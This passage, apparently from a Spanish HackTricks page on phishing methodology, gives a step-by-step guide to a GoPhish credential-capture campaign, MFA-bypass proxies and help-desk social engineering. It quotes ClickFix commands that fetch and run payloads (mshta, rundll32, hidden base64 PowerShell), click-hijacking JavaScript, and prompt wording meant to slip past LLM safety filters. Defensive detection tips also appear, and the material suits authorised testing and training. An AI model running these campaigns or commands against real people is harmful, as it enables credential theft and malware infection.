# Metodología de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodología

1. Reconocer a la víctima
   1. Selecciona el **dominio de la víctima**.
   2. Realiza una enumeración web básica **buscando portales de inicio de sesión** que use la víctima y **decide** cuál vas a **suplantar**.
   3. Usa **OSINT** para **encontrar correos electrónicos**.
2. Prepara el entorno
   1. **Compra el dominio** que vas a usar para la evaluación de phishing.
   2. **Configura los registros** relacionados con el servicio de correo electrónico (SPF, DMARC, DKIM, rDNS).
   3. Configura el VPS con **gophish**.
3. Prepara la campaña
   1. Prepara la **plantilla de correo electrónico**.
   2. Prepara la **página web** para robar las credenciales.
4. ¡Lanza la campaña!

## Generar nombres de dominio similares o comprar un dominio de confianza

### Técnicas de variación del nombre de dominio

- **Keyword**: El nombre de dominio **contiene** una **palabra clave** importante del dominio original (p. ej., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Cambia el **punto por un guion** en un subdominio (p. ej., www-zelster.com).
- **New TLD**: El mismo dominio con un **nuevo TLD** (p. ej., zelster.org).
- **Homoglyph**: **Reemplaza** una letra del nombre de dominio por **letras de aspecto similar** (p. ej., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Intercambia dos letras** del nombre de dominio (p. ej., zelsetr.com).
- **Singularization/Pluralization**: Añade o elimina una «s» al final del nombre de dominio (p. ej., zeltsers.com).
- **Omission**: **Elimina una** de las letras del nombre de dominio (p. ej., zelser.com).
- **Repetition:** **Repite una** de las letras del nombre de dominio (p. ej., zeltsser.com).
- **Replacement**: Como Homoglyph, pero menos sigiloso. Reemplaza una de las letras del nombre de dominio, quizá por una letra cercana a la original en el teclado (p. ej., zektser.com).
- **Subdomained**: Introduce un **punto** dentro del nombre de dominio (p. ej., ze.lster.com).
- **Insertion**: **Inserta una letra** en el nombre de dominio (p. ej., zerltser.com).
- **Missing dot**: Añade el TLD al nombre de dominio (p. ej., zelstercom.com).

**Herramientas automáticas**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Sitios web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Existe la **posibilidad de que algunos bits almacenados o en comunicación cambien automáticamente de valor** debido a diversos factores, como las llamaradas solares, los rayos cósmicos o errores de hardware.

Cuando este concepto se **aplica a las solicitudes DNS**, es posible que el **dominio que recibe el servidor DNS** no sea el mismo que se solicitó inicialmente.

Por ejemplo, la modificación de un solo bit en el dominio «windows.com» puede cambiarlo a «windnws.com».

Los atacantes pueden **aprovecharse de esto registrando varios dominios con bitflipping** similares al dominio de la víctima. Su intención es redirigir a los usuarios legítimos a su propia infraestructura.

Para obtener más información, lee [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Comprar un dominio de confianza

Puedes buscar un dominio caducado que puedas usar en [https://www.expireddomains.net/](https://www.expireddomains.net).\
Para asegurarte de que el dominio caducado que vas a comprar **ya tenga un buen SEO**, puedes buscar cómo está categorizado en:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Descubrir correos electrónicos

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % gratis)
- [https://phonebook.cz/](https://phonebook.cz) (100 % gratis)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Para **descubrir más** direcciones de correo electrónico válidas o **verificar las que** ya encontraste, puedes comprobar si puedes hacerles brute force a los servidores SMTP de la víctima. [Aprende aquí a verificar o descubrir direcciones de correo electrónico](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Además, no olvides que, si los usuarios utilizan **algún portal web para acceder a su correo**, puedes comprobar si es vulnerable al **brute force de nombres de usuario** y explotar la vulnerabilidad si es posible.

## Configurar GoPhish

### Instalación

Puedes descargarlo desde [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Descárgalo y descomprímelo dentro de `/opt/gophish` y ejecuta `/opt/gophish/gophish`\
Se mostrará en la salida una contraseña para el usuario administrador en el puerto 3333. Por lo tanto, accede a ese puerto y usa esas credenciales para cambiar la contraseña de administrador. Puede que necesites tunelizar ese puerto a local:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configuración

**Configuración del certificado TLS**

Antes de este paso, ya deberías haber comprado el **dominio** que vas a usar y este debe estar **apuntando** a la **IP del VPS** donde estás configurando **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Configuración del correo**

Comienza instalando: `apt-get install postfix`

Luego, agrega el dominio a los siguientes archivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Cambia también los valores de las siguientes variables dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Por último, modifica los archivos **`/etc/hostname`** y **`/etc/mailname`** para que tengan el nombre de tu dominio y **reinicia tu VPS.**

Ahora, crea un **registro A de DNS** para `mail.<domain>` que apunte a la **dirección IP** del VPS y un **registro MX de DNS** que apunte a `mail.<domain>`

Ahora probemos enviar un correo electrónico:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Configuración de Gophish**

Detén la ejecución de gophish y vamos a configurarlo.\
Modifica `/opt/gophish/config.json` de la siguiente manera (observa el uso de https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Configurar el servicio gophish**

Para crear el servicio gophish, de modo que pueda iniciarse automáticamente y administrarse como un servicio, puedes crear el archivo `/etc/init.d/gophish` con el siguiente contenido:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Termina de configurar el servicio y compruébalo haciendo:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Configurar el servidor de correo y el dominio

### Espera y sé legítimo

Cuanto más antiguo sea un dominio, menos probable será que lo detecten como spam. Por eso, debes esperar todo el tiempo posible (al menos 1 semana) antes de la evaluación de phishing. Además, si publicas una página sobre un sector de buena reputación, la reputación que obtengas será mejor.

Ten en cuenta que, aunque tengas que esperar una semana, puedes terminar de configurar todo ahora.

### Configurar el registro Reverse DNS (rDNS)

Configura un registro rDNS (PTR) que resuelva la dirección IP del VPS al nombre de dominio.

### Registro Sender Policy Framework (SPF)

Debes **configurar un registro SPF para el nuevo dominio**. Si no sabes qué es un registro SPF, [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puedes usar [https://www.spfwizard.net/](https://www.spfwizard.net) para generar tu política SPF (usa la IP de la máquina VPS).

![Formulario de SPF Wizard para generar un registro SPF para un dominio de phishing](<../../images/image (1037).png>)

Este es el contenido que debes establecer en un registro TXT del dominio:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Registro de Domain-based Message Authentication, Reporting & Conformance (DMARC)

Debes **configurar un registro DMARC para el nuevo dominio**. Si no sabes qué es un registro DMARC, [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Debes crear un nuevo registro DNS TXT que apunte al hostname `_dmarc.<domain>` con el siguiente contenido:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Debes **configurar DKIM para el nuevo dominio**. Si no sabes qué es un registro DKIM, [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Este tutorial está basado en: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Debes concatenar ambos valores B64 que genera la clave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Comprueba la puntuación de la configuración de tu correo electrónico

Puedes hacerlo en [https://www.mail-tester.com/](https://www.mail-tester.com)\
Solo tienes que acceder a la página y enviar un correo electrónico a la dirección que te indiquen:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

También puedes **comprobar la configuración de tu correo electrónico** enviando un correo a `check-auth@verifier.port25.com` y **leyendo la respuesta** (para ello, tendrás que **abrir** el puerto **25** y consultar la respuesta en el archivo _/var/mail/root_ si envías el correo como root).\
Comprueba que superas todas las pruebas:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

También puedes enviar un **mensaje a una cuenta de Gmail bajo tu control** y revisar los **encabezados del correo** en tu bandeja de entrada de Gmail. Debería aparecer `dkim=pass` en el campo de encabezado `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Eliminación de la lista negra de Spamhouse

La página [www.mail-tester.com](https://www.mail-tester.com) puede indicarte si Spamhouse está bloqueando tu dominio. Puedes solicitar que eliminen tu dominio/IP en: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Eliminación de la lista negra de Microsoft

​​Puedes solicitar que eliminen tu dominio/IP en [https://sender.office.com/](https://sender.office.com).

## Crear y lanzar una campaña de GoPhish

### Perfil de envío

- Establece un **nombre para identificar** el perfil del remitente
- Decide desde qué cuenta enviarás los correos de phishing. Sugerencias: _noreply, support, servicedesk, salesforce..._
- Puedes dejar en blanco el nombre de usuario y la contraseña, pero asegúrate de marcar «Ignorar errores de certificado»

![Crear y lanzar una campaña de GoPhish - Perfil de envío: Puedes dejar en blanco el nombre de usuario y la contraseña, pero asegúrate de marcar Ignorar errores de certificado](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Se recomienda usar la función «**Enviar correo de prueba**» para comprobar que todo funciona.\
> Recomendaría **enviar los correos de prueba a direcciones de correo de 10min** para evitar que te incluyan en una lista negra al hacer pruebas.

### Plantilla de correo electrónico

- Establece un **nombre para identificar** la plantilla
- Luego, escribe un **asunto** (nada extraño, solo algo que esperarías leer en un correo electrónico normal)
- Asegúrate de haber marcado «**Añadir imagen de seguimiento**»
- Escribe la **plantilla del correo electrónico** (puedes usar variables, como en el siguiente ejemplo):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Ten en cuenta que **para aumentar la credibilidad del correo**, se recomienda usar alguna firma de un correo del cliente. Sugerencias:

- Envía un correo a una **dirección que no exista** y comprueba si la respuesta incluye alguna firma.
- Busca **correos públicos**, como info@ex.com, press@ex.com o public@ex.com, envíales un correo y espera la respuesta.
- Intenta contactar con algún correo **válido que hayas descubierto** y espera la respuesta.

![Perfil de envío - Plantilla de correo: Intenta contactar con algún correo válido que hayas descubierto y espera la respuesta](<../../images/image (80).png>)

> [!TIP]
> La plantilla de correo también permite **adjuntar archivos para enviar**. Si también quieres robar desafíos NTLM usando archivos o documentos especialmente manipulados, [lee esta página](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Página de destino

- Escribe un **nombre**
- **Escribe el código HTML** de la página web. Ten en cuenta que puedes **importar** páginas web.
- Marca **Capture Submitted Data** y **Capture Passwords**
- Configura una **redirección**

![Plantilla de correo - Página de destino: Marca Capture Submitted Data y Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalmente tendrás que modificar el código HTML de la página y hacer algunas pruebas en local (quizás usando un servidor Apache) **hasta que te gusten los resultados**. Después, escribe ese código HTML en el cuadro.\
> Ten en cuenta que, si necesitas **usar recursos estáticos** para el HTML (quizás algunas páginas CSS y JS), puedes guardarlos en _**/opt/gophish/static/endpoint**_ y luego acceder a ellos desde _**/static/\<filename>**_

> [!TIP]
> Para la redirección, podrías **redirigir a los usuarios a la página web principal legítima** de la víctima, o redirigirlos a _/static/migration.html_, por ejemplo, mostrar una **rueda giratoria (**[**https://loading.io/**](https://loading.io)**) durante 5 segundos y luego indicar que el proceso se completó correctamente**.

### Usuarios y grupos

- Establece un nombre
- **Importa los datos** (ten en cuenta que, para usar la plantilla del ejemplo, necesitas el nombre, el apellido y la dirección de correo electrónico de cada usuario)

![Página de destino - Usuarios y grupos: Importa los datos (ten en cuenta que, para usar la plantilla del ejemplo, necesitas el nombre, el apellido y la dirección de correo electrónico de cada usuario)](<../../images/image (163).png>)

### Campaña

Por último, crea una campaña seleccionando un nombre, la plantilla de correo, la página de destino, la URL, el perfil de envío y el grupo. Ten en cuenta que la URL será el enlace enviado a las víctimas.

Ten en cuenta que el **perfil de envío permite enviar un correo de prueba para ver cómo se verá el correo de phishing final**:

![Usuarios y grupos - Campaña: Ten en cuenta que el perfil de envío permite enviar un correo de prueba para ver cómo se verá el correo de phishing final](<../../images/image (192).png>)

Cuando todo esté listo, ¡lanza la campaña!

## Clonación de sitios web

Si por algún motivo quieres clonar el sitio web, consulta la siguiente página:


{{#ref}}
clone-a-website.md
{{#endref}}

## Documentos y archivos con backdoor

En algunas evaluaciones de phishing (principalmente para Red Teams), también querrás **enviar archivos que contengan algún tipo de backdoor** (quizás un C2 o simplemente algo que desencadene una autenticación).\
Consulta la siguiente página para ver algunos ejemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing de MFA

### Mediante proxy MitM

El ataque anterior es bastante ingenioso, ya que estás falsificando un sitio web real y recopilando la información introducida por el usuario. Por desgracia, si el usuario no introdujo la contraseña correcta o si la aplicación que falsificaste está configurada con 2FA, **esta información no te permitirá suplantar la identidad del usuario engañado**.

Aquí es donde resultan útiles herramientas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) y [**muraena**](https://github.com/muraenateam/muraena). Esta herramienta te permitirá generar un ataque similar a MitM. Básicamente, los ataques funcionan de la siguiente manera:

1. **Suplantas el formulario de inicio de sesión** de la página web real.
2. El usuario **envía** sus **credenciales** a tu página falsa y la herramienta las envía a la página web real, **comprobando si las credenciales funcionan**.
3. Si la cuenta está configurada con **2FA**, la página MitM lo solicitará y, cuando el **usuario lo introduzca**, la herramienta lo enviará a la página web real.
4. Una vez que el usuario se haya autenticado, tú, como atacante, habrás **capturado las credenciales, el 2FA, la cookie y cualquier información de cada interacción que hayas tenido mientras la herramienta realiza un MitM**.

### Mediante VNC

¿Y si, en lugar de **enviar a la víctima a una página maliciosa** con el mismo aspecto que la original, la envías a una **sesión VNC con un navegador conectado a la página web real**? Podrás ver lo que hace, robar la contraseña, el MFA utilizado, las cookies...\
Puedes hacerlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detectar la detección

Obviamente, una de las mejores maneras de saber si te han descubierto es **buscar tu dominio en listas negras**. Si aparece en alguna, significa que de algún modo tu dominio fue detectado como sospechoso.\
Una forma sencilla de comprobar si tu dominio aparece en alguna lista negra es usar [https://malwareworld.com/](https://malwareworld.com)

Sin embargo, hay otras formas de saber si la víctima está **buscando activamente actividad de phishing sospechosa en Internet**, como se explica en:


{{#ref}}
detecting-phising.md
{{#endref}}

Puedes **comprar un dominio con un nombre muy similar al del dominio de la víctima** y/o **generar un certificado** para un **subdominio** de un dominio que controles **que contenga** la **palabra clave** del dominio de la víctima. Si la **víctima** realiza algún tipo de **interacción DNS o HTTP** con ellos, sabrás que **está buscando activamente** dominios sospechosos y tendrás que ser muy sigiloso.<sup>[[2]](#references)</sup>

### Evaluar el phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious)para evaluar si tu correo terminará en la carpeta de spam o si será bloqueado o tendrá éxito.

## Compromiso de identidad de alto contacto (restablecimiento de MFA por el Help Desk)

Los conjuntos de intrusión modernos cada vez prescinden más de los señuelos por correo electrónico y **atacan directamente el flujo de trabajo de la mesa de ayuda o de recuperación de identidad** para eludir el MFA. El ataque se basa por completo en técnicas de "living-off-the-land": una vez que el operador obtiene credenciales válidas, se mueve lateralmente usando herramientas de administración integradas; no se necesita malware.<sup>[[6]](#references)</sup>

### Flujo del ataque
1. Recon de la víctima 
   * Recopila datos personales y corporativos de LinkedIn, filtraciones de datos, GitHub público, etc.  
   * Identifica identidades de alto valor (ejecutivos, personal de TI, finanzas) y enumera el **proceso exacto del Help Desk** para restablecer la contraseña o el MFA.
2. Ingeniería social en tiempo real  
   * Llama por teléfono, contacta por Teams o chatea con el Help Desk mientras suplanta a la víctima (a menudo usando un **identificador de llamada falsificado** o una **voz clonada**).  
   * Proporciona la información personal identificable recopilada previamente para superar la verificación basada en conocimientos.  
   * Convence al agente de que **restablezca el secreto de MFA** o realice un **SIM swap** en un número de móvil registrado.
3. Acciones inmediatas tras el acceso (≤60 min en casos reales)  
   * Establece un punto de apoyo a través de cualquier portal web de SSO.  
   * Enumera AD / AzureAD con herramientas integradas (sin dejar binarios):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Movimiento lateral con **WMI**, **PsExec** o agentes **RMM** legítimos que ya estén en la lista de permitidos del entorno.

### Detección y mitigación
* Tratar la recuperación de identidad por parte del help desk como una **operación privilegiada**: exigir autenticación reforzada y aprobación del gerente.
* Implementar reglas de **Identity Threat Detection & Response (ITDR)** / **UEBA** que generen alertas ante:  
  * Cambio del método de MFA + autenticación desde un dispositivo o ubicación geográfica nuevos.  
  * Elevación inmediata del mismo principal (de usuario a administrador).
* Grabar las llamadas al help desk y exigir una **devolución de llamada a un número ya registrado** antes de cualquier restablecimiento.
* Implementar **Just-In-Time (JIT) / Privileged Access** para que las cuentas recién restablecidas **no hereden automáticamente tokens de altos privilegios**.

---

## Engaño a gran escala: envenenamiento SEO y campañas de “ClickFix”
Los grupos criminales comunes compensan el costo de las operaciones de alto contacto con ataques masivos que convierten **los motores de búsqueda y las redes publicitarias en el canal de distribución**.<sup>[[6]](#references)</sup>

1. El **envenenamiento SEO / malvertising** coloca un resultado falso, como `chromium-update[.]site`, en la parte superior de los anuncios de búsqueda.
2. La víctima descarga un pequeño **loader de primera etapa** (a menudo JS/HTA/ISO). Ejemplos observados por Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. El loader exfiltra cookies del navegador y bases de datos de credenciales, y luego descarga un **loader silencioso** que decide —*en tiempo real*— si desplegar:
   * RAT (p. ej., AsyncRAT, RustDesk)
   * ransomware / wiper
   * componente de persistencia (clave Run del registro + tarea programada)

### Consejos de hardening
* Bloquear dominios registrados recientemente e imponer **Advanced DNS / URL Filtering** tanto en los *anuncios de búsqueda* como en el correo electrónico.
* Restringir la instalación de software a paquetes MSI firmados o de Store; denegar la ejecución de `HTA`, `ISO`, `VBS` mediante políticas.
* Supervisar los procesos hijo de los navegadores que abren instaladores:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Busca LOLBins que suelen ser abusados por loaders de primera etapa (p. ej., `regsvr32`, `curl`, `mshta`).

### Secuestro del clic en el botón de descarga con derivación a TDS
Algunos portales de software falsos mantienen el `href` visible de descarga apuntando a la URL **real** de GitHub/release, pero secuestran la **primera** interacción del usuario mediante JavaScript y envían a la víctima a una cadena de **sistema de distribución de tráfico (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Key traits:
- El hook suele ejecutarse en la **fase de captura** (`true`) en `document`, por lo que se activa antes que los controladores del sitio.
- Chrome suele usar `mousedown` en lugar de `click` para mantener la redirección vinculada a un **gesto de usuario** válido y mejorar la evasión del bloqueador de ventanas emergentes.
- Algunas variantes abren previamente `about:blank` o simulan clics en `<a target="_blank">` y solo después asignan la URL del TDS.
- Los límites del lado del navegador suelen almacenarse en `localStorage`, por lo que el **primer clic** puede llevar al malware, mientras que las actualizaciones de página o los reintentos vuelven al enlace visible de aspecto benigno.
- El TDS puede aplicar filtros según el referrer, el dominio de entrada, la GEO, la huella digital del navegador/dispositivo, las comprobaciones de VPN/centro de datos, el contexto del clic y los contadores por sesión, lo que hace que las reproducciones de los analistas no sean deterministas.

Ideas para defensores:
- Compara el `href` **mostrado** con el destino real de navegación generado al hacer clic.
- Busca controladores `document.addEventListener(..., true)` que llamen tanto a `preventDefault()` como a `stopImmediatePropagation()` junto con `window.open`, `about:blank` o clics simulados en enlaces.
- Trata los grupos de dominios de descarga de software registrados recientemente que cargan todos la misma etapa de CloudFront/JS como un patrón de envenenamiento SEO/TDS de alta confianza.

### ClickFix desde páginas de verificación falsas + solicitudes de LOLBAS con apariencia de archivos comprimidos
Algunas ramas del TDS terminan en una página de verificación falsa (al estilo de Cloudflare/IUAM) que indica a la víctima que ejecute un binario de Windows de confianza, como:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notas:
- `mshta.exe` ejecuta el **HTA/VBScript al inicio de la respuesta**, aunque la URL se haga pasar por un archivo `.7z`; los datos de archivo añadidos pueden ser un señuelo puro.
- Las etapas posteriores suelen seguir mintiendo sobre el tipo de archivo (`.rtf` para PowerShell, `.asar` para Python, ZIPs con binarios rellenados) y luego pasar a **mapeo manual de PE / ejecución en memoria**.
- Si respondes a una de estas cadenas, conserva **la red y la memoria desde la primera ejecución exitosa**: las reproducciones posteriores pueden mostrar solo una ruta benigna de instalador/SFX o fallar porque la liberación del payload/clave estaba vinculada a la sesión TDS original.

### Tradecraft de entrega de DLL mediante ClickFix (actualización falsa de CERT)
* Señuelo: aviso clonado de un CERT nacional con un botón **Update** que muestra instrucciones paso a paso para “solucionar” el problema. Se indica a las víctimas que ejecuten un batch que descarga una DLL y la ejecuta mediante `rundll32`.<sup>[[12]](#references)</sup>
* Cadena típica de batch observada:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` guarda el payload en `%TEMP%`; una breve espera oculta las variaciones de red y, después, `rundll32` llama al punto de entrada exportado (`notepad`).
* La DLL envía la identidad del host y consulta al C2 cada pocos minutos. Las tareas remotas llegan como **PowerShell codificado en base64**, que se ejecuta oculto y omitiendo la política:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Esto conserva la flexibilidad de C2 (el servidor puede cambiar las tareas sin actualizar la DLL) y oculta las ventanas de consola. Busca procesos PowerShell secundarios de `rundll32.exe` que usen juntos `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Los defensores pueden buscar callbacks HTTP(S) con el formato `...page.php?tynor=<COMPUTER>sss<USER>` e intervalos de sondeo de 5 minutos después de cargar la DLL.

---

## Malvertising activado por visualizaciones mediante RTB

A diferencia de un resultado de búsqueda patrocinado, que requiere un clic, un anuncio RTB puede cargar JavaScript de terceros cuando se muestra su contenido creativo en un sitio web o una aplicación. Citizen Lab observó etiquetas publicitarias que llamaban a un servidor de decisión independiente con identificadores publicitarios. La mayoría de las impresiones recibieron una respuesta vacía; algunas impresiones seleccionadas podían recibir JavaScript. Por lo tanto, una respuesta benigna durante la reproducción no demuestra que todos los usuarios vieran el mismo contenido.<sup>[[14]](#references)</sup>

Esto es un **mecanismo de entrega**, no un exploit por sí mismo: ejecutar JavaScript en un contexto de visualización de anuncios no instala spyware automáticamente. No se divulgó el exploit subyacente del navegador o del sistema operativo, así que una impresión de anuncio o una solicitud al servidor de decisión por sí solas no prueban una infección. Para más información sobre la vinculación de identificadores en la segmentación RTB, consulta [Modelado de amenazas y separación de identidades](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Operaciones de phishing potenciadas por IA
Los atacantes ahora combinan **API de LLM y clonación de voz** para crear señuelos totalmente personalizados e interactuar en tiempo real.

| Capa | Ejemplo de uso por parte de un actor de amenazas |
|-------|-----------------------------|
|Automatización|Generar y enviar más de 100.000 correos electrónicos/SMS con redacción aleatorizada y enlaces de seguimiento.|
|IA generativa|Crear correos electrónicos *únicos* que mencionan fusiones y adquisiciones públicas, bromas internas de redes sociales; usar una voz falsa del CEO en una estafa de devolución de llamada.|
|IA agéntica|Registrar dominios de forma autónoma, recopilar inteligencia de fuentes abiertas y redactar correos de la siguiente etapa cuando una víctima hace clic, pero no envía sus credenciales.|

**Defensa:**  
• Añadir **banners dinámicos** que destaquen los mensajes enviados desde sistemas de automatización no confiables (mediante anomalías de ARC/DKIM).  
• Implementar **frases de desafío biométricas de voz** para solicitudes telefónicas de alto riesgo.  
• Simular continuamente señuelos generados por IA en programas de concienciación: las plantillas estáticas están obsoletas.

Ver también: abuso de la navegación agéntica para el phishing de credenciales:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Ver también: abuso de herramientas CLI locales y MCP por parte de agentes de IA (para inventario de secretos y detección):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Ensamblaje en tiempo de ejecución de JavaScript de phishing asistido por LLM (generación de código en el navegador)

Los atacantes pueden distribuir HTML de apariencia inofensiva y **generar el stealer en tiempo de ejecución** solicitando JavaScript a una **API de LLM confiable** y ejecutándolo después en el navegador (por ejemplo, con `eval` o un `<script>` dinámico).<sup>[[8]](#references)</sup>

1. **Prompt como ofuscación:** codificar URL de exfiltración/cadenas Base64 en el prompt; ajustar la redacción para eludir los filtros de seguridad y reducir las alucinaciones.
